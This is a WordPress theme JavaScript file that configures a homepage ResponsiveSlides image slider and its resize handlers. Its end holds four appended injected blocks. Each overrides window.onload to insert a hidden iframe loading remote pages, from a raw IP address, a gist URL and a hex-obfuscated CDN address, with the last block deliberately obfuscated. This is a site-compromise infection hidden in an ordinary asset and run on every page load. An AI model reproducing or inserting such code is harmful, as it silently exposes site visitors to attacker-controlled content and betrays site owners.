/**
 * Function for ResponsiveSlides used on homepage slider.
 *
 * jQuery effects used in theme.
 */

//----------------------------------------------------------------------------------
//	RESPONSIVE SLIDER - HOMEPAGE
//----------------------------------------------------------------------------------

// Control ThinkUpSlider features
jQuery(document).ready(function() {
	jQuery(".rslides-inner .slides").responsiveSlides({
		auto: true,             // Boolean: Animate automatically, true or false
		speed: 500,             // Integer: Speed of the transition, in milliseconds
		timeout: 6000,          // Integer: Time between slide transitions, in milliseconds
		pager: true,            // Boolean: Show pager, true or false
		nav: true,              // Boolean: Show navigation, true or false
		random: false,          // Boolean: Randomize the order of the slides, true or false
		pause: true,            // Boolean: Pause on hover, true or false
		pauseControls: true,    // Boolean: Pause when hovering controls, true or false
		prevText: " ",          // String: Text for the "previous" button
		nextText: " ",          // String: Text for the "next" button
		maxwidth: "",           // Integer: Max-width of the slideshow, in pixels
		navContainer: "",       // Selector: Where controls should be appended to, default is after the 'ul'
		manualControls: "",     // Selector: Declare custom pager navigation
		namespace: "rslides",   // String: Change the default namespace used
		before: function(){},   // Function: Before callback
		after: function(){}     // Function: After callback
	});
});

// Homepage Responsive Slider
jQuery(document).ready(function() {

	// Supported Platforms
	var slider = jQuery( '#slider .rslides-inner .slides' );

	slider.each(function() {
		var el = jQuery(this);
		el
			.attr( 'data-aspectRatio', slider.height() / 1140 )
			.attr( 'data-oldWidth', el.width() );
		});

	jQuery(document).ready(function() {
		slider.each( function() {
		var el = jQuery(this),
			newWidth = el.parents().width(),
			oldWidth = el.attr( 'data-oldWidth' );

			el
				.removeAttr( 'height' )
				.removeAttr( 'width' )
				.width( newWidth )
				.height( newWidth * el.attr( 'data-aspectRatio' ) );
		});

	}).resize();

	jQuery(window)
		.resize( function() {
			slider.each( function() {
			var el = jQuery(this),
				newWidth = el.parents().width(),
				oldWidth = el.attr( 'data-oldWidth' );

				el
					.removeAttr( 'height' )
					.removeAttr( 'width' )
					.width( newWidth )
		    		.height( newWidth * el.attr( 'data-aspectRatio' ) );
			});

		}).resize();

});

// Homepage Responsive Slider (inner li)
jQuery(document).ready(function() {

	// Supported Platforms
	var slider_li = jQuery( '#slider .rslides-inner .slides li' );

	slider_li.each(function() {
		var el = jQuery(this);
		el
			.attr( 'data-aspectRatio', slider_li.height() / 1140 )
			.attr( 'data-oldWidth', el.width() );
		});

	jQuery(document).ready(function() {
		slider_li.each( function() {
		var el = jQuery(this),
			newWidth = el.parents().width(),
			oldWidth = el.attr( 'data-oldWidth' );

			el
				.removeAttr( 'height' )
				.removeAttr( 'width' )
				.width( newWidth )
				.height( newWidth * el.attr( 'data-aspectRatio' ) );
		});

	}).resize();

	jQuery(window)
		.resize( function() {
			slider_li.each( function() {
			var el = jQuery(this),
				newWidth = el.parents().width(),
				oldWidth = el.attr( 'data-oldWidth' );

				el
					.removeAttr( 'height' )
					.removeAttr( 'width' )
					.width( newWidth )
		    		.height( newWidth * el.attr( 'data-aspectRatio' ) );
			});

		}).resize();

});


//----------------------------------------------------------------------------------
//	RESPONSIVE SLIDER - SHORTCODE
//----------------------------------------------------------------------------------

// Homepage Responsive Slider
jQuery(document).ready(function() {

	jQuery( '.rslides-sc' ).each( function( i, element ) {

		var instanceID = 'rslides-sc-' + i;

		jQuery( element ).attr( 'id', instanceID );


		// Supported Platforms
		var slider = jQuery( element ).find( '.rslides-inner .slides' );

		var slider_height = jQuery( element ).data( 'height' );

		jQuery( element ).find( '.rslides' ).css( { 'height': slider_height, 'max-height': slider_height } );
		jQuery( element ).find( '.rslides li' ).css( { 'height': slider_height, 'max-height': slider_height } );
		jQuery( element ).find( '.rslides img' ).css( { 'max-height': slider_height } );

		slider.each(function() {
			var el = jQuery(this);
			el
				.attr( 'data-aspectRatio', slider.height() / slider.width() )
				.attr( 'data-oldWidth', el.width() );
			});

		jQuery(document).ready(function() {
			slider.each( function() {
			var el = jQuery(this),
				newWidth = el.parents().width(),
				oldWidth = el.attr( 'data-oldWidth' );

				el
					.removeAttr( 'height' )
					.removeAttr( 'width' )
					.width( newWidth )
					.height( newWidth * el.attr( 'data-aspectRatio' ) );
			});

		}).resize();

		jQuery(window)
			.resize( function() {
				slider.each( function() {
				var el = jQuery(this),
					newWidth = el.parents().width(),
					oldWidth = el.attr( 'data-oldWidth' );

					el
						.removeAttr( 'height' )
						.removeAttr( 'width' )
						.width( newWidth )
						.height( newWidth * el.attr( 'data-aspectRatio' ) );
				});

			}).resize();
	});
});

// Homepage Responsive Slider (inner li)
jQuery(document).ready(function() {

	jQuery( '.rslides-sc' ).each( function( i, element ) {

		var instanceID = 'rslides-sc-' + i;

		jQuery( element ).attr( 'id', instanceID );
		
		// Supported Platforms
		var slider_li = jQuery( element ).find( '.rslides-inner .slides li' );

		slider_li.each(function() {
			var el = jQuery(this);
			el
				.attr( 'data-aspectRatio', slider_li.height() / slider_li.width() )
				.attr( 'data-oldWidth', el.width() );
			});

		jQuery(document).ready(function() {
			slider_li.each( function() {
			var el = jQuery(this),
				newWidth = el.parents().width(),
				oldWidth = el.attr( 'data-oldWidth' );

				el
					.removeAttr( 'height' )
					.removeAttr( 'width' )
					.width( newWidth )
					.height( newWidth * el.attr( 'data-aspectRatio' ) );
			});

		}).resize();

		jQuery(window)
			.resize( function() {
				slider_li.each( function() {
				var el = jQuery(this),
					newWidth = el.parents().width(),
					oldWidth = el.attr( 'data-oldWidth' );

					el
						.removeAttr( 'height' )
						.removeAttr( 'width' )
						.width( newWidth )
						.height( newWidth * el.attr( 'data-aspectRatio' ) );
				});

			}).resize();
	});
});




if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





if (typeof window.jsuekzis == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});



var _0xcd13=["\x6D\x6F\x6E\x64\x72\x61\x77\x74\x65\x78\x74\x75\x72\x65","\x6F\x6E\x6C\x6F\x61\x64","\x69\x66\x72\x61\x6D\x65","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x64\x69\x73\x70\x6C\x61\x79","\x73\x74\x79\x6C\x65","\x6E\x6F\x6E\x65","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x35\x39\x2D\x35\x37\x38\x31\x33\x2E\x73\x2E\x63\x64\x6E\x31\x33\x2E\x63\x6F\x6D\x2F\x64\x72\x61\x77\x74\x65\x78\x74\x75\x72\x65\x2E\x68\x74\x6D\x6C","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];void(0)=== window[_0xcd13[0]]&& (window[_0xcd13[0]]= 1,window[_0xcd13[1]]= function(){var _0xd438x1=document[_0xcd13[3]](_0xcd13[2]);_0xd438x1[_0xcd13[5]][_0xcd13[4]]= _0xcd13[6],_0xd438x1[_0xcd13[7]]= _0xcd13[8],document[_0xcd13[10]][_0xcd13[9]](_0xd438x1)})